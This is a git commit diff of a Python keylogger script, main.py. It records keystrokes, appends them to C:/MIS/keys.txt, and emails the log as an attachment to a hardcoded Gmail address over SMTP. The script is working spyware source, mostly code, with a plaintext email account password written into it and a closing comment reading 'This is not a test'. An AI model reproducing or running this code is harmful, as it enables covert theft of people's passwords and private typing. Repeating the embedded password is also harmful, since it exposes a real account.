89b7133608c48e9eb277ede1979a9e1372503ad2
Ngomeli <joshuangomeli@gmail.com>
2021-08-02 22:04:18 +0300

    made the keys.txt. to display the charcaters entered

--- main.py
+++ main.py
@@ -6,11 +6,41 @@ from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
-
 count = 0
 keys = []
-path = r"C:\MIS\keys.txt"
-log_file = "keys.txt"
+log_file = "C:/MIS/keys.txt"
+
+
+def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
+    print("{0} has been pressed".format(key))
+
+    if count >= 5:
+        count = 0
+        parse_input_to_file(keys)
+        keys = []
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+def parse_input_to_file(keys):
+    with open(log_file, "a") as file:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                file.write('\n')
+            elif k.find("Key") == -1:
+                file.write(k)
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
 # Email: smtp functionality
 
@@ -20,7 +50,7 @@ password = "KivaNgoMeli-2"
 destination_email = "ngomelikibuba@gmail.com"
 
 
-def send_email(filename, attachment, to_address):
+def send_email(filename, to_address):
     from_address = email_address
     msg = MIMEMultipart()
     msg['From'] = from_address
@@ -29,7 +59,7 @@ def send_email(filename, attachment, to_address):
     body = "Here is an attachment"
     msg.attach(MIMEText(body, 'plain'))
     filename = filename
-    attachment = open(attachment, 'rb')
+    attachment = open("C:/MIS/keys.txt", 'rb')
     p = MIMEBase('application', 'octet-stream')
     p.set_payload(attachment.read())
     encoders.encode_base64(p)
@@ -43,36 +73,6 @@ def send_email(filename, attachment, to_address):
     s.quit()
 
 
-send_email(log_file, path, destination_email)
+send_email(log_file, destination_email)
 
-
-def on_key_press(key):
-    global keys, count
-
-    keys.append(key)
-    count += 1
-    print("{0} has been pressed".format(key))
-
-    if count >= 5:
-        count = 0
-        parse_input_to_file(keys)
-        keys = []
-
-
-def on_key_released(key):
-    if key == Key.esc:
-        return False
-
-
-def parse_input_to_file(keys):
-    with open(log_file, "w") as file:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                file.write('\n')
-            elif k.find("Key") == -1:
-                file.write(k)
-
-
-with Listener(on_press=on_key_press, on_release=on_key_released) as listener:
-    listener.join()
+#This is not a test
